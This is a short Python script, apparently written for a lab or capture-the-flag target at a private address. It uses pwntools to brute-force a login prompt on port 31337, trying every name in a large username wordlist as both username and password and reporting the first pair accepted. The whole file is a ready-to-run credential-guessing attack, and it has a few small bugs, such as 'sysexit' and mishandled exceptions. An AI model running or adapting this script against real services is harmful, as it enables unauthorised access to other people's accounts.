#!/usr/bin/python3

from pwn import *
import sys, time, pdb, signal

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sysexit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)
	
if __name__=='__main__':

	host, port = "10.0.2.4", 31337

	f = open("/usr/share/wordlists/xato-net-10-million-usernames.txt", "rb")

	pl = log.progress("Fuerza bruta")
	pl.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)
	
	for username in f.readlines():

		username = username.strip()
		password = username

		pl.status("Probando la combinación %s:%s" % (username.decode(), password.decode()))
	
		try:
	
			s = remote(host, port, level='error')
			s.recvuntil(b"username> ")
			s.sendline(username)

			s.recvuntil(b"password> ")
			s.sendline(password)

			response = s.recv()

		except:
			time.sleep(5)

		if b"authentication failed" not in response:
			pl.success("Se ha encontrado una credencial válida -> %s:%s" % (username.decode(), password.decode()))
			sys.exit(0)
			
